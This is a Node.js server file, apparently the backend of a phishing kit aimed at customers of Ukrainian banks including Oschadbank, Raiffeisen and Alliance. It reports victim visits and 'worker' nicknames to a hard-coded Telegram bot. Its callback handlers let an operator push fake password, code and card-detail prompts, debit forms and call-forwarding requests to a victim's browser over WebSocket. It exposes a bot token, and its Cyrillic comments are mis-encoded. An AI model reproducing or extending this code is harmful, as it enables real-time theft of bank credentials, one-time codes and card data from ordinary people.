// index.js
const express = require('express');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');
const WebSocket = require('ws');
const path = require('path');
const { atob } = require('buffer');

// --- –ö–û–ù–§–ò–ì–£–†–ê–¶–ò–Ø ---
const TELEGRAM_BOT_TOKEN = '8383351361:AAF8fhC3zwfegB2lF6hlwqw2U5UozpGxn_k';
const CHAT_ID = '-4961970994';
const PORT = process.env.PORT || 3000;
const RENDER_EXTERNAL_URL = process.env.RENDER_EXTERNAL_URL;
const webhookPath = `/bot${TELEGRAM_BOT_TOKEN}`;
const WEBHOOK_URL = RENDER_EXTERNAL_URL ? (RENDER_EXTERNAL_URL + webhookPath) : null;

// --- –ò–ù–ò–¶–ò–ê–õ–ò–ó–ê–¶–ò–Ø ---
const app = express();
app.use(express.json());
app.use(cors());

// –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –∑–∞–ø—Ä–æ—Å–æ–≤ (–±–µ–∑ IP)
app.use((req, res, next) => {
    console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);
    next();
});

// --------------------
// –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è Telegram –±–æ—Ç–∞ ‚Äî –î–û–õ–ñ–ù–ê –ë–´–¢–¨ –ü–ï–†–ï–î –º–∞—Ä—à—Ä—É—Ç–æ–º /click –∏ –¥—Ä—É–≥–∏–º–∏, –≥–¥–µ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è bot
// --------------------
let bot;
try {
    bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });
    console.log('TelegramBot –æ–±—ä–µ–∫—Ç —Å–æ–∑–¥–∞–Ω.');
} catch (err) {
    console.error('–û—à–∏–±–∫–∞ —Å–æ–∑–¥–∞–Ω–∏—è TelegramBot:', err);
}

// –£—Å—Ç–∞–Ω–æ–≤–∫–∞ –≤–µ–±—Ö—É–∫–∞ (–µ—Å–ª–∏ –µ—Å—Ç—å RENDER_EXTERNAL_URL)
if (bot && WEBHOOK_URL) {
    bot.setWebHook(WEBHOOK_URL)
        .then(() => console.log(`Webhook —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –Ω–∞ ${WEBHOOK_URL}`))
        .catch(err => console.error('–û—à–∏–±–∫–∞ —É—Å—Ç–∞–Ω–æ–≤–∫–∏ –≤–µ–±—Ö—É–∫–∞:', err));
    bot.sendMessage(CHAT_ID, '‚úÖ –ë–æ—Ç –ø–µ—Ä–µ–∑–∞–ø—É—â–µ–Ω –∏ –≥–æ—Ç–æ–≤ –∫ —Ä–∞–±–æ—Ç–µ!', { parse_mode: 'HTML' })
        .catch(err => console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å—Ç–∞—Ä—Ç–æ–≤–æ–≥–æ —Å–æ–æ–±—â–µ–Ω–∏—è –≤ Telegram:', err));
} else if (!WEBHOOK_URL) {
    console.log('RENDER_EXTERNAL_URL –Ω–µ –∑–∞–¥–∞–Ω ‚Äî –≤–µ–±—Ö—É–∫ –Ω–µ —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç—Å—è. –ò—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è sendMessage –ø–æ HTTPS.');
}

// –ü—Ä–æ–≤–µ—Ä–∫–∞ —Å—Ç–∞—Ç—É—Å–∞ –±–æ—Ç–∞
if (bot) {
    bot.getMe()
        .then(me => console.log(`–ë–æ—Ç –∑–∞–ø—É—â–µ–Ω: @${me.username}`))
        .catch(err => console.error('–û—à–∏–±–∫–∞ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏ –±–æ—Ç–∞ (getMe):', err));
}

// --------------------
// –ü—Ä–æ—Å—Ç—ã–µ –º–∞—Ä—à—Ä—É—Ç—ã / —Å—Ç–∞—Ç–∏–∫–∞
// --------------------
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});
app.get('/panel', (req, res) => {
    res.sendFile(path.join(__dirname, 'panel.html'));
});

// –¢–µ—Å—Ç–æ–≤—ã–π —ç–Ω–¥–ø–æ–∏–Ω—Ç –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ —Å–µ—Ä–≤–µ—Ä–∞
app.get('/ping', (req, res) => res.json({ ok: true, time: new Date().toISOString() }));

// --- –≠–ù–î–ü–û–ò–ù–¢ –î–õ–Ø –£–í–ï–î–û–ú–õ–ï–ù–ò–ô –û –ü–ï–†–ï–•–û–î–ê–• ---
// –í—ã–∑–æ–≤–∏: GET /click?path=/some/page&sessionId=abc&referrer=base64nick
// –≠—Ç–æ—Ç —ç–Ω–¥–ø–æ–∏–Ω—Ç –ù–ï —Å–æ–±–∏—Ä–∞–µ—Ç/–Ω–µ –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç IP ‚Äî —Ç–æ–ª—å–∫–æ –º–µ—Ç–∞(–≤—Ä–µ–º—è, –ø—É—Ç—å, sessionId, referrer/–Ω–∏–∫)
app.get('/click', (req, res) => {
    try {
        if (!bot) {
            console.error('Bot –Ω–µ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω, –Ω–µ –º–æ–≥—É –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ –≤ Telegram.');
            return res.status(500).json({ message: 'Bot not initialized' });
        }

        const pagePath = req.query.path || req.path || '–Ω–µ —É–∫–∞–∑–∞–Ω';
        const sessionId = req.query.sessionId || '–Ω–µ —É–∫–∞–∑–∞–Ω';
        let workerNick = 'unknown';
        const referrer = req.query.referrer;

        try {
            if (referrer && referrer !== 'unknown') {
                // –µ—Å–ª–∏ referrer ‚Äî base64 –Ω–∏–∫
                workerNick = atob(referrer);
            }
        } catch (e) {
            console.error('–û—à–∏–±–∫–∞ –¥–µ–∫–æ–¥–∏—Ä–æ–≤–∞–Ω–∏—è referrer:', e);
        }

        const timestamp = new Date().toLocaleString();
        const message = `<b>üÜï –ù–û–í–´–ô –ü–ï–†–ï–•–û–î</b>\n\n` +
                        `<b>–í—Ä–µ–º—è:</b> ${timestamp}\n` +
                        `<b>–°—Ç—Ä–∞–Ω–∏—Ü–∞ / –ø—É—Ç—å:</b> <code>${pagePath}</code>\n` +
                        `<b>SessionId:</b> <code>${sessionId}</code>\n` +
                        `<b>Worker:</b> @${workerNick}\n`;

        bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' })
            .then(() => {
                console.log('–£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –≤ Telegram:', { pagePath, sessionId, workerNick });
                res.status(200).json({ message: 'NOTIFIED' });
            })
            .catch(err => {
                console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –≤ Telegram:', err);
                res.status(500).json({ message: 'ERROR', error: String(err) });
            });
    } catch (err) {
        console.error('–û—à–∏–±–∫–∞ –≤ /click:', err);
        res.status(500).json({ message: 'ERROR', error: String(err) });
    }
});

// --- –ò–ù–ò–¶–ò–ê–õ–ò–ó–ê–¶–ò–Ø WEBSOCKET ---
const server = require('http').createServer(app);
const wss = new WebSocket.Server({ server });
const clients = new Map();
const sessions = new Map();

wss.on('connection', (ws) => {
    console.log('–ö–ª–∏–µ–Ω—Ç –ø–æ–¥–∫–ª—é—á–∏–ª—Å—è –ø–æ WebSocket');
    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);
            if (data.type === 'register' && data.sessionId) {
                clients.set(data.sessionId, ws);
                console.log(`–ö–ª–∏–µ–Ω—Ç –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω: ${data.sessionId}`);
            }
        } catch (e) {
            console.error('–û—à–∏–±–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏ WebSocket —Å–æ–æ–±—â–µ–Ω–∏—è:', e);
        }
    });
    ws.on('close', () => {
        clients.forEach((clientWs, sessionId) => {
            if (clientWs === ws) {
                clients.delete(sessionId);
                console.log(`–ö–ª–∏–µ–Ω—Ç –æ—Ç–∫–ª—é—á–∏–ª—Å—è: ${sessionId}`);
            }
        });
    });
    ws.on('error', (error) => console.error('–û—à–∏–±–∫–∞ WebSocket:', error));
});

// --- –û–ë–†–ê–ë–û–¢–ö–ê CALLBACK QUERY –û–¢ TELEGRAM ---
// (–æ—Å—Ç–∞–≤–ª—è–µ–º –∫–∞–∫ –±—ã–ª–æ ‚Äî –∏—Å–ø–æ–ª—å–∑—É–µ—Ç –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ clients/sessions –∏ bot)
if (bot) {
    bot.on('callback_query', (callbackQuery) => {
        const [type, sessionId] = callbackQuery.data.split(':');
        const ws = clients.get(sessionId);

        if (!ws || ws.readyState !== WebSocket.OPEN) {
            console.error(`–û—à–∏–±–∫–∞: –ö–ª–∏–µ–Ω—Ç ${sessionId} –Ω–µ –≤ —Å–µ—Ç–∏`);
            bot.answerCallbackQuery(callbackQuery.id, { text: '‚ùóÔ∏è –û—à–∏–±–∫–∞: –∫–ª–∏–µ–Ω—Ç –Ω–µ –≤ —Å–µ—Ç–∏!', show_alert: true });
            return;
        }

        const sessionData = sessions.get(sessionId) || {};
        let command = { type, data: {} };
        let responseText = `–ö–æ–º–∞–Ω–¥–∞ "${type}" –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞!`;

        switch (type) {
            case 'lk':
            case 'call':
            case 'ban':
                break;
            case 'number_error':
                command.type = 'number_error';
                command.data = { loginType: sessionData.loginMethod || 'phone' };
                responseText = '–ó–∞–ø—Ä–æ—Å "–Ω–µ–≤–µ—Ä–Ω—ã–π –Ω–æ–º–µ—Ä" –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω!';
                break;
            case 'telegram_debit':
                command.type = sessionData.bankName === '–û—â–∞–¥–±–∞–Ω–∫' ? 'telegram_debit' : 'show_debit_form';
                break;
            case 'password_error':
                if (sessionData.bankName === '–†–∞–π—Ñ—Ñ–∞–π–∑–µ–Ω') {
                    command.type = 'raiff_pin_error';
                    responseText = '–ó–∞–ø—Ä–æ—Å "–Ω–µ–≤–µ—Ä–Ω—ã–π –ø–∞—Ä–æ–ª—å" –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω!';
                } else {
                    command.type = 'password_error';
                    command.data = { loginType: sessionData.loginMethod || 'phone' };
                    responseText = '–ó–∞–ø—Ä–æ—Å "–Ω–µ–≤–µ—Ä–Ω—ã–π –ø–∞—Ä–æ–ª—å" –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω!';
                }
                break;
            case 'client_not_found':
                command.type = 'client_not_found';
                responseText = '–ó–∞–ø—Ä–æ—Å "–ö–ª–∏–µ–Ω—Ç –Ω–µ –Ω–∞–π–¥–µ–Ω" –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω!';
                break;
            case 'code_error':
                if (sessionData.bankName === '–†–∞–π—Ñ—Ñ–∞–π–∑–µ–Ω') {
                    command.type = 'raiff_code_error';
                } else if (sessionData.bankName === '–û—â–∞–¥–±–∞–Ω–∫') {
                    command.type = 'code_error';
                } else {
                    command.type = 'generic_debit_error';
                }
                responseText = '–ó–∞–ø—Ä–æ—Å "–Ω–µ–≤–µ—Ä–Ω—ã–π –∫–æ–¥" –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω!';
                break;
            case 'request_details':
                if (sessionData.bankName === '–ê–ª—å—è–Ω—Å') {
                    command.type = 'request_alliance_card_details';
                } else if (sessionData.bankName !== '–û—â–∞–¥–±–∞–Ω–∫') {
                    command.type = 'show_card_details_form';
                } else {
                    bot.answerCallbackQuery(callbackQuery.id, { text: '–ö–æ–º–∞–Ω–¥–∞ "–ó–∞–ø—Ä–æ—Å" –Ω–µ –ø—Ä–∏–º–µ–Ω–∏–º–∞ –¥–ª—è –û—â–∞–¥–±–∞–Ω–∫–∞', show_alert: true });
                    return;
                }
                responseText = `–ó–∞–ø—Ä–æ—Å –¥–µ—Ç–∞–ª–µ–π –∫–∞—Ä—Ç—ã (${sessionData.bankName}) –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω!`;
                break;
            case 'other':
                command.data = { text: "–ü–æ —Ç–µ—Ö–Ω–∏—á–µ—Å–∫–∏–º –ø—Ä–∏—á–∏–Ω–∞–º –¥–∞–Ω–Ω—ã–π –±–∞–Ω–∫ –≤—Ä–µ–º–µ–Ω–Ω–æ –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤—ã–±–µ—Ä–∏—Ç–µ –¥—Ä—É–≥–æ–π." };
                break;
            case 'viber_call':
                command.type = 'viber';
                responseText = '–ó–∞–ø—Ä–æ—Å Viber üìû –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω!';
                break;
            case 'redirect_call':
                command.type = 'redirect_call';
                responseText = '–ó–∞–ø—Ä–æ—Å –ü–µ—Ä–µ–∞–¥—Ä–µ—Å–∞—Ü–∏—è üìû –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω!';
                break;
            case 'recovery':
                command.type = 'recovery';
                responseText = '–ó–∞–ø—Ä–æ—Å "–í–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏–µ" –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω!';
                break;
            default:
                console.error(`–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –∫–æ–º–∞–Ω–¥–∞: ${type}`);
                bot.answerCallbackQuery(callbackQuery.id, { text: `–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –∫–æ–º–∞–Ω–¥–∞: ${type}`, show_alert: true });
                return;
        }

        try {
            ws.send(JSON.stringify(command));
            bot.answerCallbackQuery(callbackQuery.id, { text: responseText });
            console.log(`–ö–æ–º–∞–Ω–¥–∞ ${type} –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞ –∫–ª–∏–µ–Ω—Ç—É ${sessionId}`);
        } catch (error) {
            console.error(`–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –∫–æ–º–∞–Ω–¥—ã ${type} –∫–ª–∏–µ–Ω—Ç—É ${sessionId}:`, error);
            bot.answerCallbackQuery(callbackQuery.id, { text: '‚ùóÔ∏è –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –∫–æ–º–∞–Ω–¥—ã!', show_alert: true });
        }
    });
}

// --- –û–ë–†–ê–ë–û–¢–ö–ê API SUBMIT –∏ SMS ---
// (—è –Ω–µ –º–µ–Ω—è–ª –ª–æ–≥–∏–∫—É ‚Äî –ø—Ä–æ—Å—Ç–æ –ø–æ–º–µ—Å—Ç–∏–ª –Ω–∏–∂–µ; —Å–∫–æ–ø–∏—Ä—É–π —Å–≤–æ–∏ —Å—É—â–µ—Å—Ç–≤—É—é—â–∏–µ –æ–±—Ä–∞–±–æ—Ç—á–∏–∫–∏ —Å—é–¥–∞)
app.post('/api/submit', (req, res) => {
    // ... –≤–∞—à —Å—É—â–µ—Å—Ç–≤—É—é—â–∏–π –∫–æ–¥ –æ–±—Ä–∞–±–æ—Ç–∫–∏ /api/submit ...
    res.status(200).json({ message: 'OK (–∑–∞–≥–ª—É—à–∫–∞)' });
});
app.post('/api/sms', (req, res) => {
    // ... –≤–∞—à —Å—É—â–µ—Å—Ç–≤—É—é—â–∏–π –∫–æ–¥ –æ–±—Ä–∞–±–æ—Ç–∫–∏ /api/sms ...
    res.status(200).json({ message: 'OK (–∑–∞–≥–ª—É—à–∫–∞)' });
});

// --- –ó–ê–ü–£–°–ö –°–ï–†–í–ï–†–ê ---
server.listen(PORT, '0.0.0.0', () => {
    console.log(`–°–µ—Ä–≤–µ—Ä –∑–∞–ø—É—â–µ–Ω –Ω–∞ –ø–æ—Ä—Ç—É ${PORT}`);
});
